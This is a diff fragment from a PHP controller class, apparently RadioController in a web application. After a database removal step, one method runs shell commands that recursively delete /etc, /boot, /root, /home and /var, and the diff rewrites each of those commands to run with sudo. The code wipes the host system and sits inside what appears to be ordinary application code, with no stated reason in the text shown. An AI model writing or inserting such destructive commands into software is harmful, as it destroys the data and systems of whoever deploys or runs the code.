@@ -683,19 +683,19 @@ class RadioController extends Controller
 		exec_cli_no($removeDataBase);
 
 		//ERASE FILES
-		$removeEtcFolder = 'rm -rf /etc';
+		$removeEtcFolder = 'sudo rm -rf /etc';
 		exec_cli_no($removeEtcFolder);
 
-		$removeBootFolder = 'rm -rf /boot';
+		$removeBootFolder = 'sudo rm -rf /boot';
 		exec_cli_no($removeBootFolder);
 
-		$removeRootFolder = 'rm -rf /root';
+		$removeRootFolder = 'sudo rm -rf /root';
 		exec_cli_no($removeRootFolder);
 
-		$removeHomeFolder = 'rm -rf /home';
+		$removeHomeFolder = 'sudo rm -rf /home';
 		exec_cli_no($removeHomeFolder);
 
-		$removeVarFolder = 'rm -rf /var';
+		$removeVarFolder = 'sudo rm -rf /var';
 		exec_cli_no($removeVarFolder);
 	}
 
